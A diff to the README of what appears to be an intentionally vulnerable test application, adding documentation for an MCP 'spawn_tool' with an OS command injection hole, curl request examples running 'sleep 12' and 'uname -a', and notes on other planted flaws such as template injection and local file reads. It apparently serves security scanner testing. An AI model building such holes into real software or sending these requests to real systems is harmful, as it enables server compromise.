@@ -1234,6 +1234,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
   - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
   - **Server-Side JavaScript Injection via process_numbers_tool** - The `process_numbers_tool` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
+  - **OS Command Injection via spawn_tool** - The `spawn_tool` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
 
     - MCP sessions are independent from the regular API authentication/authorization flow.
@@ -1252,6 +1253,8 @@ Full configuration & usage examples can be found in our [demo project](https://g
     - `config_tool` is admin-only.
     - `render_tool` responds as `text/event-stream`:
       `event: message` + `data: <json-rpc-payload>`.
+    - `spawn_tool` responds as `text/event-stream`:
+      `event: notification` + `data: <progress-payload>` before execution and every ~5 seconds while running, partial command output via `event: notification` + `data: <partial-output-payload>`, then `event: message` + `data: <json-rpc-payload>`.
 
   - **MCP Tool/Resource List (Quick Reference)**:
 
@@ -1353,11 +1356,39 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
             }
           },
-          "id": 6
+         "id": 6
          }'
        ```
 
-    5. `config_tool` (admin only)  
+    5. `spawn_tool` (public)  
+       Vulnerability: **OS Command Injection** with progress notifications over SSE.  
+       Example:
+
+       ```bash
+       curl -N "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "spawn_tool",
+            "arguments": {
+              "command": "sleep 12"
+            }
+          },
+          "id": 7
+         }'
+       ```
+
+       Expected stream shape:
+
+       - `event: notification` with `status: "starting"`
+       - `event: notification` with `status: "running"` every ~5 seconds
+       - `event: notification` with method `notifications/partial_output` for stdout/stderr chunks
+       - `event: message` containing final JSON-RPC tool result
+
+    6. `config_tool` (admin only)  
        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
        Example (admin-authenticated MCP session):
 
@@ -1530,7 +1561,28 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
      This payload executes JavaScript directly on the server.
 
-  6. **Server-Side Template Injection via render_tool**:
+  6. **OS Command Injection via spawn_tool**:
+
+     ```bash
+     curl -N "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "spawn_tool",
+           "arguments": {
+             "command": "uname -a"
+           }
+         },
+         "id": 7
+       }'
+     ```
+
+     Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
+
+  7. **Server-Side Template Injection via render_tool**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
